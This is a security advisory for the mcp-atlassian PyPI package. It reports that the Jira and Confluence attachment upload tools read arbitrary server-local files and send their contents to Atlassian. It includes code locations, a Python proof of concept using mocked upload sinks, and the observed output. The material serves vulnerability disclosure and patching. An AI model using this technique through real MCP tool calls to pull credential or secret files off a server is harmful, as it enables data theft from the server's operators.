@@ -1,0 +1,128 @@
+PYSEC-2026-4101 PyPI/mcp-atlassian — MCP Atlassian: Jira and Confluence attachment upload tools can read arbitrary server-local files
+package: mcp-atlassian
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.22.0 (ECOSYSTEM)
+aliases: CVE-2026-77253, GHSA-vc25-24vv-fxxm
+references:
+  https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-vc25-24vv-fxxm
+  https://github.com/sooperset/mcp-atlassian/pull/1448
+  https://github.com/sooperset/mcp-atlassian/commit/b041733473f95119dd539542a43c280737a8e460
+  https://github.com/sooperset/mcp-atlassian
+  https://github.com/sooperset/mcp-atlassian/releases/tag/v0.22.0
+  https://pypi.org/project/mcp-atlassian
+  https://github.com/advisories/GHSA-vc25-24vv-fxxm
+  https://nvd.nist.gov/vuln/detail/CVE-2026-77253
+
+### Summary
+
+MCP Atlassian exposes Jira and Confluence attachment upload tools that accept arbitrary local filesystem paths and upload those file contents to Atlassian. In HTTP or multi-user deployments, an MCP caller who can invoke write tools can cause the server to read any file accessible to the MCP process and send it to Jira/Confluence as an attachment.
+
+### Details
+
+The Confluence MCP upload tool accepts a `file_path` described as an absolute or relative server path in `src/mcp_atlassian/servers/confluence.py:1290-1316` and forwards it directly to `confluence_fetcher.upload_attachment()` in `src/mcp_atlassian/servers/confluence.py:1356-1363`. The multi-upload variant accepts comma-separated local paths in `src/mcp_atlassian/servers/confluence.py:1372-1449`.
+
+The Confluence attachment implementation converts relative paths to absolute paths, checks only existence, and then opens the path for upload. There is no call to `validate_safe_path()` or any allowed directory check for uploads in `src/mcp_atlassian/confluence/attachments.py:61-79`; the direct upload path opens the file with `open(file_path, "rb")` in `src/mcp_atlassian/confluence/attachments.py:467-490`.
+
+The Jira upload implementation has the same pattern: it converts relative paths, checks existence, and opens the path in `src/mcp_atlassian/jira/attachments.py:371-388`. Jira issue update also accepts an `attachments` field as JSON or CSV local paths in `src/mcp_atlassian/servers/jira.py:1609-1662`, forwards it through update fields in `src/mcp_atlassian/servers/jira.py:1668-1676`, and `IssuesMixin.update_issue()` calls `self.upload_attachments(issue_key, kwargs["attachments"])` in `src/mcp_atlassian/jira/issues.py:1132-1137`.
+
+The tools are decorated with `@check_write_access`, so `READ_ONLY_MODE=true` blocks them. However, in default write-enabled deployments, the only security boundary is whether the MCP caller can invoke write tools. Combined with HTTP/multi-user exposure, this becomes a server-side arbitrary file read/exfiltration primitive to the configured Jira/Confluence instance.
+
+### PoC
+
+The following proof uses temporary files and mocked upload sinks only. It does not contact Atlassian or modify remote data.
+
+```bash
+uv run python - <<'PY'
+import json, tempfile
+from pathlib import Path
+from types import SimpleNamespace
+from mcp_atlassian.confluence.attachments import AttachmentsMixin as ConfluenceAttachmentsMixin
+from mcp_atlassian.confluence.config import ConfluenceConfig
+from mcp_atlassian.jira.attachments import AttachmentsMixin as JiraAttachmentsMixin
+from mcp_atlassian.jira.config import JiraConfig
+
+class FakeResponse:
+    def raise_for_status(self):
+        pass
+    def json(self):
+        return {'results': [{'id': 'att-poc'}]}
+
+class FakeConfluenceSession:
+    def __init__(self):
+        self.uploaded = None
+    def put(self, url, headers=None, files=None, data=None):
+        file_tuple = files['file']
+        self.uploaded = {
+            'url': url,
+            'filename': file_tuple[0],
+            'content': file_tuple[1].read().decode(),
+        }
+        file_tuple[1].close()
+        return FakeResponse()
+
+def confluence_probe(secret_path):
+    fetcher = object.__new__(ConfluenceAttachmentsMixin)
+    session = FakeConfluenceSession()
+    fetcher.config = ConfluenceConfig(url='https://confluence.example.test/wiki', auth_type='pat', personal_token='token')
+    fetcher.confluence = SimpleNamespace(_session=session)
+    result = fetcher.upload_attachment('123456', str(secret_path))
+    return {'result_success': result.get('success'), 'uploaded': session.uploaded}
+
+class FakeJiraApi:
+    def __init__(self):
+        self.uploaded = None
+    def add_attachment(self, issue_key, filename):
+        self.uploaded = {
+            'issue_key': issue_key,
+            'filename': Path(filename).name,
+            'content': Path(filename).read_text(),
+        }
+        return {'id': 'att-poc'}
+
+def jira_probe(secret_path):
+    fetcher = object.__new__(JiraAttachmentsMixin)
+    fake = FakeJiraApi()
+    fetcher.config = JiraConfig(url='https://jira.example.test', auth_type='pat', personal_token='token')
+    fetcher.jira = fake
+    result = fetcher.upload_attachment('SAFE-1', str(secret_path))
+    return {'result_success': result.get('success'), 'uploaded': fake.uploaded}
+
+with tempfile.TemporaryDirectory(prefix='mcp-atlassian-upload-poc-') as tmp:
+    secret_path = Path(tmp) / 'server-secret.txt'
+    secret_path.write_text('SERVER_LOCAL_SECRET_MARKER')
+    print(json.dumps({
+        'confluence': confluence_probe(secret_path),
+        'jira': jira_probe(secret_path),
+    }, indent=2, sort_keys=True))
+PY
+```
+
+Observed output from this environment:
+
+```json
+{
+  "confluence": {
+    "result_success": true,
+    "uploaded": {
+      "content": "SERVER_LOCAL_SECRET_MARKER",
+      "filename": "server-secret.txt",
+      "url": "https://confluence.example.test/wiki/rest/api/content/123456/child/attachment"
+    }
+  },
+  "jira": {
+    "result_success": true,
+    "uploaded": {
+      "content": "SERVER_LOCAL_SECRET_MARKER",
+      "filename": "server-secret.txt",
+      "issue_key": "SAFE-1"
+    }
+  }
+}
+```
+
+The proof demonstrates that attacker-supplied local paths reach file reads and the contents are passed to the upload sink.
+
+### Impact
+
+A caller with MCP write-tool access can exfiltrate any file readable by the MCP server process to an Atlassian issue or Confluence page that the configured account can write to. In containerized or server deployments this can include mounted secrets, environment files, OAuth fallback token files, service-account credentials, source code, or other local data. The attack is remote when the MCP server is exposed over HTTP and requires only ability to call the attachment/update write tools.
